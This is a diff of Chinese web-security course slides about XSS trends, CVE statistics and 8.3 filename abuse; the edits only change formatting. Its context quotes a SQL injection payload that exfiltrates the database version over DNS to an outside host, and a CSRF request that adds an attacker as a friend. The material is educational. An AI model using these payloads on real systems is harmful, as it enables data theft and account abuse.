@@ -1569,7 +1569,7 @@ select load_file(concat('\\\\', version(), '.6a7087aa4e3b2c743ed1.d.zhack.ca\\1.
 
 ---
 
-## 现代 XSS {id="modern-xss-1"} 相比 `“古代” XSS`
+## 现代 XSS 相比 `“古代” XSS` {id="modern-xss-1"} 
 
 * 漏洞利用目标没变：跨域访问（读取和篡改）数据
 * 漏洞基本原理没变：恶意代码运行在浏览器上
@@ -1581,6 +1581,8 @@ select load_file(concat('\\\\', version(), '.6a7087aa4e3b2c743ed1.d.zhack.ca\\1.
 
 [![](images/chap0x07/xss-cve-history-1.png)](https://www.cvedetails.com/vulnerabilities-by-types.php)
 
+---
+
 > 相比于年度漏洞总数的变化趋势，XSS 的漏洞总数变化非常稳定
 
 ---
@@ -1589,6 +1591,8 @@ select load_file(concat('\\\\', version(), '.6a7087aa4e3b2c743ed1.d.zhack.ca\\1.
 
 [![](images/chap0x07/xss-cve-history-2.png)](https://www.cvedetails.com/vulnerabilities-by-types.php)
 
+---
+
 > 众所周知「预编译 SQL 语句」的普及使得 SQL 注入漏洞挖掘难度越来越高，所以 SQL 注入漏洞的年度统计趋势是呈明显下降趋势的
 
 ---
@@ -1596,6 +1600,8 @@ select load_file(concat('\\\\', version(), '.6a7087aa4e3b2c743ed1.d.zhack.ca\\1.
 ## 现代 XSS 相比 `“古代” XSS` 利用价值“稳中有升” {id="modern-xss-4"}
 
 [![](images/chap0x07/xss-cve-history-3.png)](https://www.cvedetails.com/vulnerabilities-by-types.php)
+
+---
 
 > 只看 XSS 漏洞数量的年度统计，“稳中有升”的曝光数量间接证明了其利用价值是“稳中有升”的：从投入产出比的经济学角度思考
 
@@ -1900,7 +1906,7 @@ http://victim.org/addFriend.do?friend=attacker@gmail.com
 
 ---
 
-### `8.3` 命名规则的一次滥用过程 {id=""rules-of-8.3"} 
+### `8.3` 命名规则的一次滥用过程
 
 * 例如，文件名 `exampletest.txt` 按照 `8.3` 命名规则会被自动转换为 `EXAMPL~1.txt`。如果此时该目录下存在另一个文件名 `examplefile.txt`，则按照 `8.3` 命名规则该文件会被自动转换为 `EXAMPL~2.TXT`
 * 注意，`8.3` 规则命名的文件和原文件名是等价的，操作系统会负责解析加载 `8.3` 规则命名的正确文件
